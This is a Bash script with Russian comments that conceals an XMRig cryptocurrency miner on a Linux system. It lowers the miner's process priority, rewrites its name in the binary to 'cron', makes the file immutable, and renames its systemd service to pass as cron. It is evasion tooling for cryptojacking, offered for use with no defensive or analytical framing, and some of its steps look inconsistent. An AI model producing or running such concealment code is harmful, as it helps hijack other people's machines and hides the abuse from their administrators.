#!/bin/bash

# Цветовые переменные для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Путь к XMRig
XMRIG_PATH="/opt/xmrig"
XMRIG_SERVICE="/etc/systemd/system/xmrig.service"

# Функция для сокрытия нагрузки
hide_load() {
    echo -e "${BLUE}Сокрытие нагрузки процессора...${NC}"
    
    # Снижение приоритета CPU и изменение IO
    ionice -c3 -p "$(pgrep xmrig)"  # Снижение приоритета IO
    renice -n 19 -p "$(pgrep xmrig)"  # Снижение приоритета процесса
    
    # Изменение имени процесса
    sed -i 's/xmrig/cron/g' "$XMRIG_PATH/build/xmrig"
    systemctl daemon-reload
    systemctl restart xmrig.service
    
    echo -e "${GREEN}Процесс скрыт!${NC}"
}

# Функция для сокрытия файла и сервиса
hide_files() {
    echo -e "${BLUE}Сокрытие файлов...${NC}"
    
    # Изменение прав доступа и имени
    chattr +i "$XMRIG_PATH/build/xmrig"
    mv "$XMRIG_PATH/build/xmrig" "$XMRIG_PATH/build/cron"
    
    # Изменение имени сервиса
    mv "$XMRIG_SERVICE" "/etc/systemd/system/cron-xmrig.service"
    sed -i 's/xmrig/cron/g' "/etc/systemd/system/cron-xmrig.service"
    systemctl daemon-reload
    systemctl restart cron-xmrig.service
    
    echo -e "${GREEN}Файлы скрыты!${NC}"
}

# Запуск функций
hide_load
hide_files

echo -e "${GREEN}Скрипт завершен.${NC}"
